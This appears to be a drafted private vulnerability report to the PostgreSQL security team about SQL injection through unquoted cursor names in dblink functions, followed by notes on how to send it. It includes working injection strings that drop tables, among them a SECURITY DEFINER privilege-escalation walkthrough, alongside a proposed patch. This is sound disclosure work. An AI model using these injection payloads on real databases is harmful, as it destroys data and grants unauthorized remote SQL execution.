# Email to security@postgresql.org — copy-paste body

**To:** security@postgresql.org
**Subject:** SQL injection via unquoted cursor name in dblink_open / dblink_close / dblink_fetch (contrib/dblink)
**Body:**

---

Hello PostgreSQL security team,

I'd like to report a SQL injection in three SQL-callable functions of
the `dblink` contrib extension. The unsanitized argument is the
`cursorname` parameter; it's substituted verbatim into the SQL string
sent to the remote server via `libpqsrv_exec` (which uses
`PQsendQuery`, simple-query protocol — multi-statement OK), with no
`quote_identifier` / `quote_ident_cstr` call.

The same file (`contrib/dblink/dblink.c`) already defines
`quote_ident_cstr` at line 2336 and uses it five times for
column-name substitution in `dblink_build_sql_*`. Cursor-name
substitution is the inconsistent gap.

## Affected functions and lines

All in `contrib/dblink/dblink.c`, verified against PostgreSQL master
at commit 901ed9b35 (2026-05-08), and against the packaged PostgreSQL
16.13 (Ubuntu 16.13-0ubuntu0.24.04.1).

- `dblink_open`  — line 479: `appendStringInfo(&buf, "DECLARE %s CURSOR FOR %s", curname, sql);`
- `dblink_close` — line 546: `appendStringInfo(&buf, "CLOSE %s", curname);`
- `dblink_fetch` — line 644: `appendStringInfo(&buf, "FETCH %d FROM %s", howmany, curname);`

All three pass the constructed `buf.data` to `libpqsrv_exec`, which
sends a simple-query message that accepts multiple `;`-separated
statements.

## Cleanest single-call PoC: `dblink_close`

`dblink_close` is the cleanest exploit because its SQL template
(`CLOSE %s`) has no other dynamic content, and decrementing the
cursor count to 0 triggers dblink's implicit `COMMIT` of the
transaction the injected DDL runs in.

```sql
-- On remote
CREATE TABLE secret(id int);
INSERT INTO secret VALUES (1),(2),(3);

-- On local (any role with PUBLIC EXECUTE on dblink_close)
SELECT dblink_connect('myconn',
    'host=... port=... user=... dbname=... password=...');
SELECT dblink_open('myconn', 'normalcursor', 'SELECT 1');
SELECT dblink_close('myconn',
    'normalcursor; DROP TABLE secret; --',
    false);
```

Remote `postgresql.log`:
```
LOG:  statement: BEGIN
LOG:  statement: DECLARE normalcursor CURSOR FOR SELECT 1
LOG:  statement: CLOSE normalcursor; DROP TABLE secret; --
LOG:  statement: COMMIT
```

After: `\dt secret` returns *"Did not find any relation named 'secret'"*.

## Privilege-escalation scenario (the real threat)

The dblink module is documented as a "by design caller-trusted"
component when used directly. The real risk emerges when an
application wraps the cursor-management functions in a
`SECURITY DEFINER` function to delegate cursor operations without
granting arbitrary remote SQL.

Verified end-to-end on Postgres 16.13:

1. Admin (`postgres` superuser on local) creates a wrapper to
   delegate cursor management to less-privileged users:

   ```sql
   CREATE OR REPLACE FUNCTION app_open_remote_cursor(cur_name text)
   RETURNS text LANGUAGE plpgsql SECURITY DEFINER AS $$
   BEGIN
       PERFORM dblink_connect_u('app_pipe',
           'host=... port=... user=postgres dbname=postgres');
       RETURN dblink_open('app_pipe', cur_name, 'SELECT 1 AS x');
   END $$;

   CREATE OR REPLACE FUNCTION app_close_remote_cursor(cur_name text)
   RETURNS text LANGUAGE plpgsql SECURITY DEFINER AS $$
   BEGIN
       RETURN dblink_close('app_pipe', cur_name);
   END $$;

   GRANT EXECUTE ON FUNCTION app_open_remote_cursor(text)  TO attacker;
   GRANT EXECUTE ON FUNCTION app_close_remote_cursor(text) TO attacker;
   ```

   The admin's intent: "attacker can name a cursor; they cannot pick
   the SQL the cursor wraps."

2. `attacker` has **no SELECT/INSERT/UPDATE/DELETE/DROP** on the
   remote `admin_data` table (`REVOKE ALL FROM PUBLIC`); attempting
   `SELECT secret FROM admin_data` via attacker's own credentials
   fails with permission-denied.

3. Attacker calls the wrapper:
   ```sql
   SELECT app_open_remote_cursor('benign');
   SELECT app_close_remote_cursor('benign; DROP TABLE admin_data; --');
   ```

4. Result: `admin_data` is **DROPPED** on the remote, executed under
   the remote `postgres` identity that `dblink_connect_u` authenticated
   as inside the SECURITY DEFINER context.

This is the real exploit shape: any application or admin script that
wraps `dblink_open`/`dblink_close`/`dblink_fetch` in a SECURITY
DEFINER context and accepts a user-supplied cursor name allows
non-superusers to execute arbitrary SQL on the remote server with
the wrapper's privileged identity. The cursor-name parameter is
documented at
<https://www.postgresql.org/docs/current/contrib-dblink-open.html>
only as *"The name to assign to this cursor"* — there is no warning
that callers must `quote_ident()` it.

## Why the existing dblink permission model doesn't catch this

`dblink--1.2.sql` only `REVOKE ALL ... FROM public` on
`dblink_connect_u`. The cursor-management functions
(`dblink_open`/`dblink_close`/`dblink_fetch`) are left at the
default PUBLIC EXECUTE after `CREATE EXTENSION dblink`. The
admin-side defense — `dblink_connect_u` being superuser-only — does
its job for the connection step; the gap is on the cursor-name
substitution step.

## Proposed patch (3 lines, reuses the existing helper)

```diff
diff --git a/contrib/dblink/dblink.c b/contrib/dblink/dblink.c
--- a/contrib/dblink/dblink.c
+++ b/contrib/dblink/dblink.c
@@ -476,7 +476,9 @@ dblink_open(PG_FUNCTION_ARGS)
 	if (rconn->newXactForCursor)
 		(rconn->openCursorCount)++;

-	appendStringInfo(&buf, "DECLARE %s CURSOR FOR %s", curname, sql);
+	appendStringInfo(&buf, "DECLARE %s CURSOR FOR %s",
+	                 quote_ident_cstr(curname), sql);
 	res = libpqsrv_exec(conn, buf.data, dblink_we_get_result);
 	if (!res || PQresultStatus(res) != PGRES_COMMAND_OK)
 	{
@@ -543,7 +545,7 @@ dblink_close(PG_FUNCTION_ARGS)

 	conn = rconn->conn;

-	appendStringInfo(&buf, "CLOSE %s", curname);
+	appendStringInfo(&buf, "CLOSE %s", quote_ident_cstr(curname));

 	/* close the cursor */
 	res = libpqsrv_exec(conn, buf.data, dblink_we_get_result);
@@ -641,7 +643,8 @@ dblink_fetch(PG_FUNCTION_ARGS)
 		dblink_conn_not_avail(conname);

 	initStringInfo(&buf);
-	appendStringInfo(&buf, "FETCH %d FROM %s", howmany, curname);
+	appendStringInfo(&buf, "FETCH %d FROM %s",
+	                 howmany, quote_ident_cstr(curname));

 	/*
 	 * Try to execute the query.  Note that since libpq uses malloc, the
```

The change applies `quote_ident_cstr` (defined at `dblink.c:2336`,
already used for column-name substitution in
`dblink_build_sql_insert/update/delete`) to the cursor name. Behavior
for legitimate identifier-shaped cursor names is unchanged
(round-trips through `quote_ident`).

## Verified affected versions

- Live PoC verified on PostgreSQL 16.13 (Ubuntu packaged).
- Pattern unchanged in master @ 901ed9b35 (2026-05-08).
- `dblink_open` / `dblink_close` / `dblink_fetch` signatures and SQL
  templates have been stable since the dblink module was introduced;
  likely affects all currently-supported branches.

## Discovery method

This was found by an automated taint-analysis pipeline I'm building
(kuzushi taint-iris-next, run against an LLM-curated CWE catalog on
the focused `contrib/postgres_fdw/` + `contrib/dblink/` subtree). The
pipeline produced a high-confidence candidate; I then audited and
verified the live PoC by hand on a two-cluster Postgres 16.13 setup.

## Responsible disclosure

I am writing this report PRIVATELY to security@postgresql.org and
have not discussed it publicly, including no posts on social
networks, blogs, or GitHub. I will not publicly disclose until you
have had time to evaluate and (if you choose) patch.

Please let me know:

1. Whether you consider this CVE-worthy, or whether this falls under
   the "dblink is documented as caller-trusted" doctrine. (I argue
   it's the former because of the SECURITY DEFINER privilege-
   escalation scenario above and the documentation gap on cursor-
   name handling, but I defer to your threat model.)
2. Your preferred disclosure timeline. I am happy to wait for an
   out-of-cycle release if needed.
3. Whether you'd like me to coordinate on CVE assignment via MITRE
   or you'd prefer to handle it through your usual channels.
4. Whether the proposed 3-line patch is acceptable, or you'd like
   me to write a more comprehensive fix (e.g., also rejecting
   embedded NUL bytes, adding a regression test).

Happy to provide further detail, additional PoCs (e.g. via
postgres_fdw user mappings rather than `dblink_connect_u`), or to
collaborate on the fix.

Thank you for your work on PostgreSQL.

— <your name>
  <your affiliation / "independent security researcher">
  <your contact, ideally a PGP-encrypted address or a Signal number>

---

## Notes on what to fill in before sending

1. **Replace `<your name>` / `<your affiliation>` / `<your contact>`** at the bottom. The PG security team generally prefers a PGP key for follow-up but plain email is accepted.

2. **Decide on CVE coordination.** If you want a CVE for portfolio reasons, request it explicitly. If you're fine with it landing as a regular commit credit ("Reported by …"), say so. The PG team can go either way.

3. **Attach the unified diff** as a separate file named `dblink-quote-cursor-name.patch` (the content is in the artifact at `findings/2026-05-12-postgres-dblink-cursor-name-injection.md`). Don't paste it inline if it's long — they prefer attachments.

4. **PGP encryption is optional.** The PG security team's GPG key is published at https://www.postgresql.org/community/contributors/ — they prefer encrypted reports for high-severity issues. For this report, I'd send it encrypted given the working PoC.

5. **Expect 1-7 day initial response.** The team typically acknowledges receipt within a week and then asks for clarifications. They've been responsive on past dblink-adjacent reports (CVE-2018-1058, CVE-2020-25694).

6. **Don't post the PoC publicly until they say so.** Their disclosure norm is to ship the fix in the next quarterly minor release and disclose the day of release. They'll tell you the embargo window.

7. **What probably happens:**
   - Best case: they accept as a CVE, ship the patch in the next minor release (typically 8 weeks from now), credit you in the release notes.
   - Likely case: they accept the patch as a hardening commit (no CVE), credit you in the commit message ("Reported by …").
   - Worst case: they decline ("by design, caller responsibility, use quote_ident"). In which case you can still publish the analysis as a defense-in-depth advisory, and they often land the hardening patch anyway.

8. **Memeability rating:** If it lands as a CVE — high. The headline "PostgreSQL dblink: 20+ year-old cursor-name SQL injection" plus the SECURITY DEFINER privesc scenario is genuinely viral. If it lands as a hardening commit — still a respectable acknowledgment.
